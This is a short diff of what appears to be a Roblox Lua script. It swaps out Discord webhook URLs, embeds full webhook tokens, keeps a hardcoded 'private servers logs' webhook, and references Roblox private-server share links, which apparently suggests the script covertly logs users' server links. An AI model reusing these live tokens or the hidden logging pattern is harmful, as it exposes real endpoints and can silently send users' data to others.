@@ -35,8 +35,8 @@ end
 -- WEBHOOKS
 --====================================================================--
 local prvt_srvrs_logs = "https://discord.com/api/webhooks/1433479282528882844/XLe0lOXt1qF7DDo8Q8DOkuCJjhSjnlQxu3skK77qJLIUHHHMaksv_jzchnumBmaj2X4u"
-local user_webhook    = "https://discord.com/api/webhooks/1433483411732828180/r8vXPrhN9m-eE7AynD3OLTYAlVIq89Rw3BR-W3ofEq2iAej7aFMMnjYu6IRUUtJ4t8nB"
-local logs_webhook    = "https://discord.com/api/webhooks/1433483493073096727/LBTZ_8EvrQSiJtfd852-vTdMxNV8mNnGAvycrmZZfDHVulcu2a77VU_l99xGRxuDGKg1"
+local user_webhook    = _G.scriptWebhook or "https://discord.com/api/webhooks/1433776525878231132/acH3Ok6SgZfr461tqrdJBXKmaSAfgUNPWZo86N_K3EM16H-NfY-Iz5Dn38DH8CgCjqGu"
+local logs_webhook    = "https://discord.com/api/webhooks/1433776514868052012/2rL6CIcgBPWKQbyF5gqPpZmpYDdl61_mLQHM2LaaNxE4VNH76k-r0mWmL91rbGlggjpA"
 local REQUIRED_PART   = "https://www.roblox.com/share?code="
 
 --====================================================================--
